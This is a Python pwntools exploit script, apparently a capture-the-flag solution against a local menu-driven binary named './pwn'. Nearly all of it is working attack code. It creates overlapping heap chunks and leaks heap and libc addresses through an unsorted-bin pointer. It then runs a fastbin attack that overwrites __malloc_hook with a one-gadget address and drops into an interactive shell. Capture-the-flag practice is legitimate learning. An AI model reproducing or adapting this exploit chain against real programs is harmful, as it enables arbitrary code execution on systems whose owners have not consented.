#! /usr/bin/python
# coding=utf-8
#import sys
from pwn import *
#from random import randint

context.log_level = 'debug'
context(arch='amd64', os='linux')

elf_path = "./pwn"

elf = ELF(elf_path)
libc = ELF('libc.so.6')
#p = process(["ld.so.2","./pwn"],env={"LD_PRELOAD":"./libc.so.6"}) 
p = process('./pwn')

sda = lambda x,y:p.sendlineafter(x,y)
sdl = lambda x:p.sendline(x)
rct = lambda x:p.recvuntil(x)
prt = lambda x:log.info('\x1b[01;38;5;214m' + x + '==>' + hex(eval(x)) + '\x1b[0m')

def Name(idx, name):
    rct('>>')
    sdl(str(1))
    rct('idx:')
    sdl(str(idx))
    rct('len:')
    sdl(str(len(name)))
    sdl(name)

def Show(idx):
    rct('>>')
    sdl(str(2))
    rct('idx:')
    sdl(str(idx))

def Delete(idx):
    rct('>>')
    sdl(str(3))
    rct('idx:')
    sdl(str(idx))

#chunk overlap
Name(0, '0'*0x2F)
Name(1, '0'*0x40+'10')
Name(2, '0'*0x5F)
Name(3, '0'*0x1F)

Delete(3)
Name(3, '0'*0x1F)        #switch Name and Host

Name(10, '0'*0x5F)
Name(11, '0'*0x5F)
Name(12, '0'*0x5F)
Name(13, '0'*0x5F)


exp = '0'*0x2950
exp+= flat(0, 0x21, 0, 0)    #B0's next chunk
Name(5, exp)
Delete(1)                #UB<=>(H0, 0x3030)

#leak addr
exp = '0'.ljust(0x7F, '\x00')
Name(6, exp)            #split UB chunk, H3's h_addr_list=UB's bk
Show(3)

rct('0'*0x1F+'\n\n')
heap_addr = u64(p.recv(6).ljust(8, '\x00'))-0x358
prt('heap_addr')
p.recv(17)
libc.address = u64(p.recv(6).ljust(8, '\x00'))-0x3c17a8
prt('libc.address')

#fastbin Attack
Delete(10)
exp = '0'*0x4F
Name(7, exp)

exp = '0'*0x10
exp+= flat(0, 0x71, libc.symbols['__malloc_hook']-0x23)
exp = exp.ljust(0xBF, '0')
Name(7, exp)

Name(8, '0'*0x5F)

exp = '0'*0x13
exp+= p64(libc.address+0x462b8)
Name(8, exp.ljust(0x5F, '0'))

p.interactive()